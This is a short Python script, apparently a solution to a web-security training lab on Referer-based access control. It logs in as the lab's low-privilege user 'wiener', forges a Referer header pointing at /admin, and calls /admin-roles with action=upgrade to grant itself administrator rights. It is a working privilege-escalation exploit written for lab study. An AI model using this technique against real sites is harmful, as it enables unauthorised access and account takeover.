#!/usr/bin/env python3
"""Referer-based access control"""

from lab_11 import Lab

def main() -> None:
    """Entry point"""
    site = Lab()
    csrf = site.csrf_token("/login")
    site.login(username="wiener", password="peter", csrf=csrf)
    payload = {"username": "wiener", "action": "upgrade"}
    site.session.headers.update({"Referer": site.url + "/admin"})
    response = site.session.get(site.url + "/admin-roles", params=payload)
    print(response.status_code)

if __name__ == "__main__":
    main()
